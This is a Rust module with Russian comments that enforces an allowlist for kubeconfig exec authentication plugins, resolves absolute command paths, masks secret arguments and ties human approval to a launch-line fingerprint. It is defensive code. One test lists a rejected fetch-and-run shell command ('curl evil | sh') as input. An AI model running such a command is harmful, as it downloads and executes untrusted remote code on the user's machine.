//! Exec-плагины kubeconfig (спец. §5.2): список разрешённых команд, путь к команде, строка запуска
//! и её подтверждение человеком. Glafira запускает только команды из списка, по абсолютному пути
//! и без оболочки.

use std::path::{Path, PathBuf};

use sha2::{Digest, Sha256};

use crate::i18n::LocalizedText;
use crate::storage::profile::ExecAuth;

/// Разрешённые команды: имя исполняемого файла и первые позиционные аргументы
/// (пустой список — любые аргументы).
pub const ALLOWED: &[(&str, &[&str])] = &[
    // EKS
    ("aws", &["eks", "get-token"]),
    // EKS, старые kubeconfig
    ("aws-iam-authenticator", &["token"]),
    // GKE
    ("gke-gcloud-auth-plugin", &[]),
    // AKS (Azure kubelogin) и OIDC (int128/kubelogin)
    ("kubelogin", &["get-token"]),
    // OIDC: Keycloak, Dex (в том числе Deckhouse)
    ("kubectl", &["oidc-login", "get-token"]),
    // OpenShift с внешним OIDC (ROSA HCP с external auth)
    ("oc", &["get-token"]),
    // Yandex Managed Kubernetes
    ("yc", &["k8s", "create-token"]),
    // Rancher без генерации токенов в kubeconfig
    ("rancher", &["token"]),
];

/// Имя исполняемого файла без каталога и `.exe`; на Windows — без учёта регистра.
pub fn command_name(command: &str) -> String {
    let name = Path::new(command)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();
    let name = if cfg!(windows) {
        name.to_lowercase()
    } else {
        name
    };
    match name.len().checked_sub(4) {
        Some(i) if name.is_char_boundary(i) && name[i..].eq_ignore_ascii_case(".exe") => {
            name[..i].to_string()
        }
        _ => name,
    }
}

/// Позиционные аргументы: ведущие ключи пропускаются (`--ключ значение`, `--ключ=значение`) —
/// так `aws eks update-kubeconfig` пишет `--region` перед `eks get-token`.
fn positional(args: &[String]) -> &[String] {
    let mut i = 0;
    while i < args.len() && args[i].starts_with('-') {
        i += if args[i].contains('=') { 1 } else { 2 };
    }
    &args[i.min(args.len())..]
}

/// Разрешена ли команда: имя файла и первые позиционные аргументы из `ALLOWED`.
pub fn check_allowed(command: &str, args: &[String]) -> Result<(), LocalizedText> {
    let name = command_name(command);
    let Some((_, prefix)) = ALLOWED.iter().find(|(n, _)| *n == name) else {
        return Err(ltext!(
            "errors.exec.notAllowed",
            "“{{command}}” is not in the list of allowed exec plugins",
            command = name
        ));
    };
    let pos = positional(args);
    let matches = pos.len() >= prefix.len() && prefix.iter().zip(pos).all(|(p, a)| p == a);
    if !matches {
        return Err(ltext!(
            "errors.exec.argsNotAllowed",
            "The exec plugin “{{command}}” may run only as “{{expected}} …”",
            command = name,
            expected = std::iter::once(name.as_str())
                .chain(prefix.iter().copied())
                .collect::<Vec<_>>()
                .join(" ")
        ));
    }
    Ok(())
}

/// Похоже ли имя переменной окружения или ключа командной строки на секрет: такие значения
/// не показываются и не экспортируются. `PASS` покрывает PASSWORD, PASSWD и PASSPHRASE.
pub fn is_secret_name(name: &str) -> bool {
    let n = name.to_ascii_uppercase();
    [
        "TOKEN",
        "SECRET",
        "PASS",
        "KEY",
        "BEARER",
        "COOKIE",
        "CREDENTIAL",
    ]
    .iter()
    .any(|w| n.contains(w))
}

/// Место значения секретного аргумента в списке аргументов.
struct SecretArg {
    /// Имя ключа без ведущих дефисов.
    flag: String,
    /// Номер элемента списка, в котором лежит значение.
    index: usize,
    /// `--имя=значение`: значение — часть того же элемента после `=`; иначе (`--имя значение`) —
    /// отдельный следующий элемент.
    inline: bool,
}

impl SecretArg {
    fn value<'a>(&self, args: &'a [String]) -> &'a str {
        let a = args[self.index].as_str();
        if self.inline {
            a.split_once('=').map_or("", |(_, v)| v)
        } else {
            a
        }
    }

    fn set(&self, args: &mut [String], value: &str) {
        let a = &mut args[self.index];
        if self.inline {
            let keep = a.find('=').map_or(a.len(), |i| i + 1);
            a.truncate(keep);
            a.push_str(value);
        } else {
            *a = value.to_string();
        }
    }
}

/// Секретные аргументы: `--имя=значение` или пара `--имя значение`, где имя ключа без ведущих
/// дефисов подходит под `is_secret_name` (`--oidc-client-secret=…` у kubectl oidc-login,
/// `--client-secret …` у Azure kubelogin). Значением пары считается следующий элемент, каким бы
/// он ни был; ключ без значения в конце списка ничего не скрывает.
fn secret_args(args: &[String]) -> Vec<SecretArg> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        i += 1;
        if !a.starts_with('-') {
            continue;
        }
        let (name, inline) = match a.split_once('=') {
            Some((name, _)) => (name, true),
            None => (a.as_str(), false),
        };
        let flag = name.trim_start_matches('-');
        if !is_secret_name(flag) {
            continue;
        }
        if inline {
            out.push(SecretArg {
                flag: flag.to_string(),
                index: i - 1,
                inline,
            });
        } else if i < args.len() {
            out.push(SecretArg {
                flag: flag.to_string(),
                index: i,
                inline,
            });
            i += 1;
        }
    }
    out
}

/// Аргументы, в которых значения секретных ключей заменены на `mask`.
pub fn mask_secret_args(args: &[String], mask: &str) -> Vec<String> {
    let mut out = args.to_vec();
    for slot in secret_args(args) {
        slot.set(&mut out, mask);
    }
    out
}

/// Аргументы без значений секретных ключей (для экспорта): `--имя=значение` становится `--имя=`,
/// в паре `--имя значение` значение становится пустой строкой.
pub fn blank_secret_args(args: &[String]) -> Vec<String> {
    mask_secret_args(args, "")
}

/// Все секретные значения exec-плагина: переменные окружения с секретными именами и значения
/// секретных аргументов; пустые пропускаются. По ним маскируется вывод плагина.
pub fn secret_values(e: &ExecAuth) -> Vec<String> {
    let env = e
        .env
        .iter()
        .filter(|v| is_secret_name(&v.name))
        .map(|v| v.value.clone());
    let from_args = secret_args(&e.args)
        .into_iter()
        .map(|slot| slot.value(&e.args).to_string());
    env.chain(from_args).filter(|v| !v.is_empty()).collect()
}

/// Подставляет локальные секреты туда, где во входящем плагине значение пустое: файл обмена
/// секретов не несёт, а обновление подключения не должно их стирать. Переменные сопоставляются
/// по имени, аргументы — по имени ключа; непустое значение из файла остаётся как есть.
pub fn inherit_secrets(incoming: &mut ExecAuth, local: &ExecAuth) {
    for v in &mut incoming.env {
        if v.value.is_empty()
            && is_secret_name(&v.name)
            && let Some(l) = local.env.iter().find(|l| l.name == v.name)
        {
            v.value.clone_from(&l.value);
        }
    }
    let local_slots = secret_args(&local.args);
    for slot in secret_args(&incoming.args) {
        if slot.value(&incoming.args).is_empty()
            && let Some(l) = local_slots.iter().find(|l| l.flag == slot.flag)
        {
            slot.set(&mut incoming.args, l.value(&local.args));
        }
    }
}

/// Отпечаток строки запуска: путь, аргументы, переменные окружения, версия API и
/// `provideClusterInfo`. Подтверждение человека хранится как этот отпечаток.
pub fn fingerprint(e: &ExecAuth) -> String {
    let env: Vec<(&str, &str)> = e
        .env
        .iter()
        .map(|v| (v.name.as_str(), v.value.as_str()))
        .collect();
    let canonical = serde_json::to_vec(&(
        &e.command,
        &e.args,
        env,
        &e.api_version,
        e.provide_cluster_info,
    ))
    .expect("serializable");
    Sha256::digest(&canonical)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// Подтверждена ли человеком именно эта строка запуска.
pub fn is_approved(e: &ExecAuth) -> bool {
    e.approved.as_deref() == Some(fingerprint(e).as_str())
}

/// Стандартные каталоги команд, которых может не быть в PATH приложения: Homebrew,
/// `/usr/local/bin`, `~/.local/bin`; на Windows — ярлыки winget и `%LOCALAPPDATA%`.
pub fn standard_dirs(home: Option<&Path>, local_app_data: Option<&Path>) -> Vec<PathBuf> {
    if cfg!(windows) {
        local_app_data
            .map(|d| {
                vec![
                    d.join("Microsoft").join("WinGet").join("Links"),
                    d.to_path_buf(),
                ]
            })
            .unwrap_or_default()
    } else {
        let mut dirs = vec![
            PathBuf::from("/opt/homebrew/bin"),
            PathBuf::from("/usr/local/bin"),
        ];
        if let Some(h) = home {
            dirs.push(h.join(".local").join("bin"));
        }
        dirs
    }
}

/// Где искать команду: каталоги PATH (оболочки входа или процесса), затем стандартные; без повторов.
/// Только абсолютные каталоги: `.` или `bin` в PATH означали бы запуск того, что лежит в рабочем
/// каталоге, а `resolve_command` обязан вернуть абсолютный путь.
pub fn search_dirs(path_var: Option<&str>, standard: Vec<PathBuf>) -> Vec<PathBuf> {
    let mut out: Vec<PathBuf> = Vec::new();
    let from_path = path_var
        .map(|p| std::env::split_paths(p).collect::<Vec<_>>())
        .unwrap_or_default();
    for d in from_path.into_iter().chain(standard) {
        if d.is_absolute() && !out.contains(&d) {
            out.push(d);
        }
    }
    out
}

/// Абсолютный путь к команде: абсолютный путь — как есть, относительный путь с каталогом —
/// от каталога kubeconfig (`base`, как у kubectl), имя — поиском по `dirs`. `None` — не найдена.
pub fn resolve_command(
    command: &str,
    base: Option<&Path>,
    dirs: &[PathBuf],
    is_file: &dyn Fn(&Path) -> bool,
) -> Option<PathBuf> {
    let p = Path::new(command.trim());
    if p.as_os_str().is_empty() {
        return None;
    }
    if p.is_absolute() {
        return is_file(p).then(|| p.to_path_buf());
    }
    if p.components().count() > 1 {
        return base
            .map(|b| b.join(p))
            .filter(|c| c.is_absolute() && is_file(c));
    }
    dirs.iter().find_map(|d| {
        let mut candidates = vec![d.join(p)];
        if cfg!(windows) && p.extension().is_none() {
            candidates.push(d.join(format!("{}.exe", p.display())));
        }
        candidates.into_iter().find(|c| is_file(c))
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::storage::profile::{ExecEnv, sample_exec};

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| s.to_string()).collect()
    }

    /// Список разрешённых команд (спец. §5.2): имя и первые аргументы.
    #[test]
    fn allowlist_table() {
        let allowed = [
            (
                "/usr/local/bin/aws",
                &[
                    "--region",
                    "eu-west-1",
                    "eks",
                    "get-token",
                    "--cluster-name",
                    "c",
                ][..],
            ),
            (
                "/usr/local/bin/aws",
                &["--profile=dev", "eks", "get-token"][..],
            ),
            ("/usr/bin/aws-iam-authenticator", &["token", "-i", "c"][..]),
            ("/opt/gcloud/bin/gke-gcloud-auth-plugin", &[][..]),
            (
                "/opt/homebrew/bin/kubelogin",
                &["get-token", "--login", "azurecli", "--server-id", "x"][..],
            ),
            (
                "/usr/local/bin/kubectl",
                &["oidc-login", "get-token", "--oidc-issuer-url=https://dex"][..],
            ),
            (
                "/usr/local/bin/oc",
                &["get-token", "--issuer-url=https://x"][..],
            ),
            (
                "/home/u/yandex-cloud/bin/yc",
                &["k8s", "create-token", "--profile=default"][..],
            ),
            (
                "/usr/local/bin/rancher",
                &["token", "--server=rancher.corp"][..],
            ),
        ];
        for (cmd, a) in allowed {
            assert_eq!(check_allowed(cmd, &args(a)), Ok(()), "{cmd} {a:?}");
        }
        let rejected = [
            (
                "/bin/sh",
                &["-c", "curl evil | sh"][..],
                "errors.exec.notAllowed",
            ),
            (
                "/usr/bin/python3",
                &["get-token"][..],
                "errors.exec.notAllowed",
            ),
            (
                "/usr/local/bin/kubectl",
                &["get", "pods"][..],
                "errors.exec.argsNotAllowed",
            ),
            (
                "/usr/local/bin/kubectl",
                &["oidc-login"][..],
                "errors.exec.argsNotAllowed",
            ),
            (
                "/usr/local/bin/aws",
                &["s3", "ls"][..],
                "errors.exec.argsNotAllowed",
            ),
            ("/usr/local/bin/oc", &[][..], "errors.exec.argsNotAllowed"),
            (
                "/usr/local/bin/kubectl-evil",
                &["oidc-login", "get-token"][..],
                "errors.exec.notAllowed",
            ),
        ];
        for (cmd, a, key) in rejected {
            assert_eq!(
                check_allowed(cmd, &args(a)).unwrap_err().key,
                key,
                "{cmd} {a:?}"
            );
        }
        let e = check_allowed("/usr/local/bin/kubectl", &args(&["get"])).unwrap_err();
        assert_eq!(e.params["expected"], "kubectl oidc-login get-token");
    }

    #[test]
    fn command_names() {
        assert_eq!(command_name("/usr/local/bin/kubelogin"), "kubelogin");
        assert_eq!(command_name("kubelogin.exe"), "kubelogin");
        assert_eq!(command_name("aws.EXE"), "aws");
        assert_eq!(command_name(""), "");
    }

    #[test]
    fn secret_like_names() {
        for s in [
            "AWS_SECRET_ACCESS_KEY",
            "AWS_SESSION_TOKEN",
            "OIDC_PASSWORD",
            "api_key",
            "DB_PASSWD",
            "OIDC_PASSPHRASE",
            "PASS",
            "AUTH_BEARER",
            "SESSION_COOKIE",
            "GOOGLE_APPLICATION_CREDENTIALS",
            "oidc-client-secret",
        ] {
            assert!(is_secret_name(s), "{s}");
        }
        for s in [
            "AWS_PROFILE",
            "AWS_REGION",
            "HTTPS_PROXY",
            "KUBECONFIG",
            "PATH",
            "HOME",
            "oidc-issuer-url",
        ] {
            assert!(!is_secret_name(s), "{s}");
        }
    }

    /// Exec-плагин с секретами в переменной окружения и в аргументах (обе формы записи).
    fn exec_with_secrets() -> ExecAuth {
        let mut e = sample_exec();
        e.env.push(ExecEnv {
            name: "AWS_SECRET_ACCESS_KEY".into(),
            value: "s3cr3t".into(),
        });
        e.args.extend(args(&[
            "--oidc-client-secret=top-secret",
            "--client-secret",
            "pair-secret",
        ]));
        e
    }

    #[test]
    fn secret_argument_values_are_blanked_and_masked() {
        let a = args(&[
            "get-token",
            "--login",
            "spn",
            "--client-secret",
            "pair-secret",
            "--oidc-client-secret=top-secret",
            "-token=short",
            "--server-id=api://x",
            "--region",
            "eu-west-1",
            "--password=",
            "--token-file",
        ]);
        assert_eq!(
            blank_secret_args(&a),
            args(&[
                "get-token",
                "--login",
                "spn",
                "--client-secret",
                "",
                "--oidc-client-secret=",
                "-token=",
                "--server-id=api://x",
                "--region",
                "eu-west-1",
                "--password=",
                "--token-file",
            ]),
            "значение без пары и не-ключи не трогаются"
        );
        assert_eq!(
            mask_secret_args(&a, "***"),
            args(&[
                "get-token",
                "--login",
                "spn",
                "--client-secret",
                "***",
                "--oidc-client-secret=***",
                "-token=***",
                "--server-id=api://x",
                "--region",
                "eu-west-1",
                "--password=***",
                "--token-file",
            ])
        );
        // Позиционное `token` у aws-iam-authenticator — не ключ.
        let b = args(&["token", "-i", "c"]);
        assert_eq!(blank_secret_args(&b), b);
        assert_eq!(blank_secret_args(&[]), Vec::<String>::new());
    }

    #[test]
    fn secret_values_cover_env_and_arguments() {
        let e = exec_with_secrets();
        assert_eq!(secret_values(&e), ["s3cr3t", "top-secret", "pair-secret"]);
        let blanked = ExecAuth {
            env: e
                .env
                .iter()
                .map(|v| ExecEnv {
                    name: v.name.clone(),
                    value: if is_secret_name(&v.name) {
                        String::new()
                    } else {
                        v.value.clone()
                    },
                })
                .collect(),
            args: blank_secret_args(&e.args),
            ..e.clone()
        };
        assert!(secret_values(&blanked).is_empty(), "пустые не возвращаются");
        assert!(secret_values(&sample_exec()).is_empty());
    }

    #[test]
    fn local_secrets_fill_empty_incoming_values_only() {
        let local = exec_with_secrets();
        let mut incoming = ExecAuth {
            env: vec![
                local.env[0].clone(),
                ExecEnv {
                    name: "AWS_SECRET_ACCESS_KEY".into(),
                    value: String::new(),
                },
            ],
            args: blank_secret_args(&local.args),
            ..local.clone()
        };
        inherit_secrets(&mut incoming, &local);
        assert_eq!(incoming.env, local.env);
        assert_eq!(incoming.args, local.args);

        // Непустое значение из файла не затирается; секрета без пары среди локальных нет.
        let mut incoming = ExecAuth {
            env: vec![
                ExecEnv {
                    name: "AWS_SECRET_ACCESS_KEY".into(),
                    value: "new".into(),
                },
                ExecEnv {
                    name: "OTHER_TOKEN".into(),
                    value: String::new(),
                },
            ],
            args: args(&["oidc-login", "get-token", "--oidc-client-secret="]),
            ..local.clone()
        };
        inherit_secrets(&mut incoming, &local);
        assert_eq!(incoming.env[0].value, "new");
        assert_eq!(incoming.env[1].value, "");
        assert_eq!(incoming.args[2], "--oidc-client-secret=top-secret");
    }

    #[test]
    fn search_dirs_keep_absolute_directories_only() {
        let path = std::env::join_paths([".", "bin", "../x", "/usr/bin", ""])
            .unwrap()
            .into_string()
            .unwrap();
        let dirs = search_dirs(Some(&path), standard_dirs(Some(Path::new("home")), None));
        assert!(dirs.iter().all(|d| d.is_absolute()), "{dirs:?}");
        if cfg!(unix) {
            assert_eq!(
                dirs,
                ["/usr/bin", "/opt/homebrew/bin", "/usr/local/bin"].map(PathBuf::from),
                "относительные каталоги PATH и домашний каталог без корня отброшены"
            );
        }
    }

    #[test]
    fn relative_command_needs_an_absolute_base() {
        let any = |_: &Path| true;
        assert_eq!(
            resolve_command("bin/plugin", Some(Path::new("kube")), &[], &any),
            None
        );
        assert_eq!(resolve_command("bin/plugin", None, &[], &any), None);
    }

    #[test]
    fn approval_follows_the_launch_line() {
        let mut e = sample_exec();
        assert!(!is_approved(&e));
        e.approved = Some(fingerprint(&e));
        assert!(is_approved(&e));
        let fp = fingerprint(&e);
        assert_eq!(fp.len(), 64);
        for change in [
            |e: &mut ExecAuth| e.command = "/opt/homebrew/bin/kubectl".into(),
            |e: &mut ExecAuth| e.args.push("--v=1".into()),
            |e: &mut ExecAuth| {
                e.env.push(ExecEnv {
                    name: "X".into(),
                    value: "1".into(),
                })
            },
            |e: &mut ExecAuth| e.env[0].value = "http://other:3128".into(),
            |e: &mut ExecAuth| e.provide_cluster_info = true,
            |e: &mut ExecAuth| e.api_version = crate::storage::profile::EXEC_API_V1BETA1.into(),
        ] {
            let mut changed = e.clone();
            change(&mut changed);
            assert!(!is_approved(&changed), "{changed:?}");
        }
    }

    #[test]
    fn command_resolution() {
        let files = [
            PathBuf::from("/opt/homebrew/bin/kubelogin"),
            PathBuf::from("/home/u/.kube/bin/plugin"),
            PathBuf::from("/usr/bin/aws"),
        ];
        let is_file = |p: &Path| files.iter().any(|f| f == p);
        let dirs = search_dirs(
            Some("/usr/bin:/bin"),
            standard_dirs(Some(Path::new("/home/u")), None),
        );
        if cfg!(unix) {
            assert_eq!(
                dirs,
                [
                    "/usr/bin",
                    "/bin",
                    "/opt/homebrew/bin",
                    "/usr/local/bin",
                    "/home/u/.local/bin"
                ]
                .map(PathBuf::from)
            );
            assert_eq!(
                resolve_command("kubelogin", None, &dirs, &is_file),
                Some(PathBuf::from("/opt/homebrew/bin/kubelogin"))
            );
            assert_eq!(
                resolve_command("aws", None, &dirs, &is_file),
                Some(PathBuf::from("/usr/bin/aws")),
                "PATH раньше стандартных каталогов"
            );
            assert_eq!(
                resolve_command(
                    "bin/plugin",
                    Some(Path::new("/home/u/.kube")),
                    &dirs,
                    &is_file
                ),
                Some(PathBuf::from("/home/u/.kube/bin/plugin")),
                "относительный путь — от каталога kubeconfig"
            );
            assert_eq!(
                resolve_command("/usr/bin/aws", None, &[], &is_file),
                Some(PathBuf::from("/usr/bin/aws"))
            );
        }
        assert_eq!(
            resolve_command("gke-gcloud-auth-plugin", None, &dirs, &is_file),
            None
        );
        assert_eq!(resolve_command(" ", None, &dirs, &is_file), None);
    }
}
